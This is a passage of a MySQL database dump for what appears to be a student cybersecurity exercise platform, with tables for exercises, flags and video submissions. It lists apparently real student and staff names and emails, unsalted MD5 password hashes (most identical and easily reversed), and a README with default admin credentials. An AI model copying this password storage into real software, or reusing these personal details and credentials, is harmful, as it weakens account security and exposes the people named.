(17, 3, 'sshOB1', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-04 00:29:18');

-- --------------------------------------------------------

--
-- Table structure for table `submitted_videos`
--

CREATE TABLE `submitted_videos` (
  `video_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `exercise_id` varchar(10) NOT NULL,
  `video_link` varchar(255) NOT NULL,
  `submission_date` timestamp NOT NULL DEFAULT current_timestamp(),
  `status` enum('submitted','approved','rejected') DEFAULT 'submitted',
  `remarks` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `submitted_videos`
--

INSERT INTO `submitted_videos` (`video_id`, `student_id`, `exercise_id`, `video_link`, `submission_date`, `status`, `remarks`) VALUES
(1, 1, 'sshOA1', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 06:25:52', 'submitted', NULL),
(2, 1, 'sshOA2', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 06:26:17', 'submitted', NULL),
(3, 1, 'sshOB1', 'https://www.youtube.com/watch?v=ihhSHgTOsFE', '2024-12-03 06:26:30', 'submitted', NULL),
(4, 1, 'sshOB2', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 06:26:42', 'submitted', NULL),
(5, 1, 'sshDA', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 06:26:53', 'submitted', NULL),
(6, 1, 'sshDB', 'https://www.youtube.com/watch?v=8ZQjvW4HJNk', '2024-12-03 06:27:05', 'submitted', NULL),
(7, 1, 'sshDC', 'https://asciinema.org/a/xPc0mgJZ170uZGndZK28bKnlK', '2024-12-03 06:27:18', 'submitted', NULL),
(8, 2, 'sshOA1', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 16:25:52', 'submitted', NULL),
(9, 2, 'sshOA2', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 16:26:17', 'submitted', NULL),
(10, 2, 'sshOB1', 'https://www.youtube.com/watch?v=ihhSHgTOsFE', '2024-12-03 16:26:30', 'submitted', NULL),
(11, 2, 'sshOB2', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 16:26:42', 'submitted', NULL),
(12, 2, 'sshDA', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-03 16:26:53', 'submitted', NULL),
(13, 2, 'sshDB', 'https://www.youtube.com/watch?v=8ZQjvW4HJNk', '2024-12-03 16:27:05', 'submitted', NULL),
(14, 2, 'sshDC', 'https://asciinema.org/a/xPc0mgJZ170uZGndZK28bKnlK', '2024-12-03 16:27:18', 'submitted', NULL),
(15, 3, 'sshOA1', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-04 00:27:18', 'submitted', NULL),
(16, 3, 'sshOA2', 'https://asciinema.org/a/Ej0Ul3TOLSaMm91Yu7LaZq91E', '2024-12-04 00:28:18', 'submitted', NULL),
(17, 3, 'sshOB1', 'https://www.youtube.com/watch?v=ihhSHgTOsFE', '2024-12-04 00:29:18', 'submitted', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role_id` int(11) DEFAULT NULL,
  `is_verified` tinyint(1) NOT NULL DEFAULT 0,
  `verification_token` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password`, `role_id`, `is_verified`, `verification_token`) VALUES
(1, 'YEO JUN KEN', 'yeojk-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(2, 'INSTRUCTOR_USER', 'instructor@example.com', '5f4dcc3b5aa765d61d8327deb882cf99', 2, 1, NULL),
(3, 'ADMIN_USER', 'admin@example.com', '5f4dcc3b5aa765d61d8327deb882cf99', 3, 1, NULL),
(4, 'TAN YI YANG', 'tanyy-wm21@student.tarc.edu.my', 'ba482523f3137be8fb72a3c40fe0f152', 1, 1, NULL),
(5, 'KUEK BOON KANG', 'kuekbk-jm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(6, 'IAN LAI WEN KYE', 'ianlwk-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(7, 'NG JUN QI', 'ngjq-wb21@student.tarc.edu.my', 'e99a18c428cb38d5f260853678922e03', 1, 1, NULL),
(8, 'SHOONG WAI KIN', 'shoongwk@tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 2, 1, NULL),
(9, 'CHEW ZI AN', 'chewza-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(10, 'WONG JING HAN', 'wongjh-pm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(11, 'PANG ZHI KEAN', 'pangzk-jm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(12, 'LEE HONG TIEN', 'leeht-wm19@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(13, 'LEONG JING XUAN', 'leongjx-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(14, 'SEBASTIAN CHOW WY LIK', 'chowwl-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(15, 'CHONG CHENG HAO', 'chongch-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(16, 'LOW ZII HUEI', 'lowzh-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(17, 'LOW ZII YUN', 'lowzy-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(18, 'LEE TZE YUEN', 'leety-wm21@student.tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 1, NULL),
(19, 'CHAW THIM VAI', 'chawtv@tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 2, 1, NULL),
(20, 'OOI CHUN PEW', 'cpooi@tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 2, 1, NULL),
(21, 'JESSIE TEOH POH LIN', 'plteoh@tarc.edu.my', '5f4dcc3b5aa765d61d8327deb882cf99', 2, 1, NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `actual_answers`
--
ALTER TABLE `actual_answers`
  ADD PRIMARY KEY (`id`),
  ADD KEY `exercise_id` (`exercise_id`);

--
-- Indexes for table `class`
--
ALTER TABLE `class`
  ADD PRIMARY KEY (`class_name`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `class_scenarios`
--
ALTER TABLE `class_scenarios`
  ADD PRIMARY KEY (`class_name`,`scenario_id`),
  ADD KEY `scenario_id` (`scenario_id`);

--
-- Indexes for table `exercise`
--
ALTER TABLE `exercise`
  ADD PRIMARY KEY (`exercise_id`),
  ADD KEY `scenario_id` (`scenario_id`);

--
-- Indexes for table `exercise_ratings`
--
ALTER TABLE `exercise_ratings`
  ADD PRIMARY KEY (`rating_id`),
  ADD UNIQUE KEY `student_id` (`student_id`,`exercise_id`),
  ADD KEY `exercise_id` (`exercise_id`);

--
-- Indexes for table `flag`
--
ALTER TABLE `flag`
  ADD PRIMARY KEY (`flag_id`),
  ADD KEY `exercise_id` (`exercise_id`);

--
-- Indexes for table `instructors`
--
ALTER TABLE `instructors`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `instructor_classes`
--
ALTER TABLE `instructor_classes`
  ADD PRIMARY KEY (`instructor_id`,`class_name`),
  ADD KEY `class_name` (`class_name`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD PRIMARY KEY (`email`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `scenario`
--
ALTER TABLE `scenario`
  ADD PRIMARY KEY (`scenario_id`),
  ADD KEY `instructor_id` (`instructor_id`);

--
-- Indexes for table `scenario_ratings`
--
ALTER TABLE `scenario_ratings`
  ADD PRIMARY KEY (`rating_id`),
  ADD UNIQUE KEY `student_id` (`student_id`,`scenario_id`),
  ADD KEY `scenario_id` (`scenario_id`);

--
-- Indexes for table `scores`
--
ALTER TABLE `scores`
  ADD PRIMARY KEY (`id`),
  ADD KEY `student_id` (`student_id`),
  ADD KEY `exercise_id` (`exercise_id`);

--
-- Indexes for table `scoring_criteria`
--
ALTER TABLE `scoring_criteria`
  ADD PRIMARY KEY (`id`),
  ADD KEY `scenario_id` (`scenario_id`);

--
-- Indexes for table `students`
--
ALTER TABLE `students`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `student_id` (`student_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `student_classes`
--
ALTER TABLE `student_classes`
  ADD PRIMARY KEY (`student_id`,`class_name`),
  ADD KEY `class_name` (`class_name`);

--
-- Indexes for table `submitted_files`
--
ALTER TABLE `submitted_files`
  ADD PRIMARY KEY (`file_id`),
  ADD UNIQUE KEY `student_id` (`student_id`,`exercise_id`),
  ADD KEY `exercise_id` (`exercise_id`);

--
-- Indexes for table `submitted_videos`
--
ALTER TABLE `submitted_videos`
  ADD PRIMARY KEY (`video_id`),
  ADD UNIQUE KEY `student_id` (`student_id`,`exercise_id`),
  ADD KEY `exercise_id` (`exercise_id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `email` (`email`),
  ADD UNIQUE KEY `username` (`username`),
  ADD KEY `role_id` (`role_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `actual_answers`
--
ALTER TABLE `actual_answers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `exercise_ratings`
--
ALTER TABLE `exercise_ratings`
  MODIFY `rating_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `instructors`
--
ALTER TABLE `instructors`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `scenario`
--
ALTER TABLE `scenario`
  MODIFY `scenario_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `scenario_ratings`
--
ALTER TABLE `scenario_ratings`
  MODIFY `rating_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `scores`
--
ALTER TABLE `scores`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `scoring_criteria`
--
ALTER TABLE `scoring_criteria`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `students`
--
ALTER TABLE `students`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `submitted_files`
--
ALTER TABLE `submitted_files`
  MODIFY `file_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `submitted_videos`
--
ALTER TABLE `submitted_videos`
  MODIFY `video_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `actual_answers`
--
ALTER TABLE `actual_answers`
  ADD CONSTRAINT `actual_answers_ibfk_1` FOREIGN KEY (`exercise_id`) REFERENCES `exercise` (`exercise_id`);

--
-- Constraints for table `class`
--
ALTER TABLE `class`
  ADD CONSTRAINT `class_ibfk_1` FOREIGN KEY (`created_by`) REFERENCES `instructors` (`id`);

--
-- Constraints for table `class_scenarios`
--
ALTER TABLE `class_scenarios`
  ADD CONSTRAINT `class_scenarios_ibfk_1` FOREIGN KEY (`class_name`) REFERENCES `class` (`class_name`) ON DELETE CASCADE,
  ADD CONSTRAINT `class_scenarios_ibfk_2` FOREIGN KEY (`scenario_id`) REFERENCES `scenario` (`scenario_id`) ON DELETE CASCADE;

--
-- Constraints for table `exercise`
--
ALTER TABLE `exercise`
  ADD CONSTRAINT `exercise_ibfk_1` FOREIGN KEY (`scenario_id`) REFERENCES `scenario` (`scenario_id`);

--
-- Constraints for table `exercise_ratings`
--
ALTER TABLE `exercise_ratings`
  ADD CONSTRAINT `exercise_ratings_ibfk_1` FOREIGN KEY (`student_id`) REFERENCES `students` (`id`),
  ADD CONSTRAINT `exercise_ratings_ibfk_2` FOREIGN KEY (`exercise_id`) REFERENCES `exercise` (`exercise_id`);

--
-- Constraints for table `flag`
--
ALTER TABLE `flag`
  ADD CONSTRAINT `flag_ibfk_1` FOREIGN KEY (`exercise_id`) REFERENCES `exercise` (`exercise_id`);

--
-- Constraints for table `instructors`
--
ALTER TABLE `instructors`
  ADD CONSTRAINT `instructors_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`);

--
-- Constraints for table `instructor_classes`
--
ALTER TABLE `instructor_classes`
  ADD CONSTRAINT `instructor_classes_ibfk_1` FOREIGN KEY (`instructor_id`) REFERENCES `instructors` (`id`),
  ADD CONSTRAINT `instructor_classes_ibfk_2` FOREIGN KEY (`class_name`) REFERENCES `class` (`class_name`);

--
-- Constraints for table `scenario`
--
ALTER TABLE `scenario`
  ADD CONSTRAINT `scenario_ibfk_1` FOREIGN KEY (`instructor_id`) REFERENCES `instructors` (`id`);

--
-- Constraints for table `scenario_ratings`
--
ALTER TABLE `scenario_ratings`
  ADD CONSTRAINT `scenario_ratings_ibfk_1` FOREIGN KEY (`student_id`) REFERENCES `students` (`id`),
  ADD CONSTRAINT `scenario_ratings_ibfk_2` FOREIGN KEY (`scenario_id`) REFERENCES `scenario` (`scenario_id`);

--
-- Constraints for table `scores`
--
ALTER TABLE `scores`
  ADD CONSTRAINT `scores_ibfk_1` FOREIGN KEY (`student_id`) REFERENCES `students` (`id`),
  ADD CONSTRAINT `scores_ibfk_2` FOREIGN KEY (`exercise_id`) REFERENCES `exercise` (`exercise_id`);

--
-- Constraints for table `scoring_criteria`
--
ALTER TABLE `scoring_criteria`
  ADD CONSTRAINT `scoring_criteria_ibfk_1` FOREIGN KEY (`scenario_id`) REFERENCES `scenario` (`scenario_id`) ON DELETE CASCADE;

--
-- Constraints for table `students`
--
ALTER TABLE `students`
  ADD CONSTRAINT `students_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`);

--
-- Constraints for table `student_classes`
--
ALTER TABLE `student_classes`
  ADD CONSTRAINT `student_classes_ibfk_1` FOREIGN KEY (`student_id`) REFERENCES `students` (`id`),
  ADD CONSTRAINT `student_classes_ibfk_2` FOREIGN KEY (`class_name`) REFERENCES `class` (`class_name`);

--
-- Constraints for table `submitted_files`
--
ALTER TABLE `submitted_files`
  ADD CONSTRAINT `submitted_files_ibfk_1` FOREIGN KEY (`student_id`) REFERENCES `students` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `submitted_files_ibfk_2` FOREIGN KEY (`exercise_id`) REFERENCES `exercise` (`exercise_id`);

--
-- Constraints for table `submitted_videos`
--
ALTER TABLE `submitted_videos`
  ADD CONSTRAINT `submitted_videos_ibfk_1` FOREIGN KEY (`student_id`) REFERENCES `students` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `submitted_videos_ibfk_2` FOREIGN KEY (`exercise_id`) REFERENCES `exercise` (`exercise_id`);

--
-- Constraints for table `users`
--
ALTER TABLE `users`
  ADD CONSTRAINT `users_ibfk_1` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
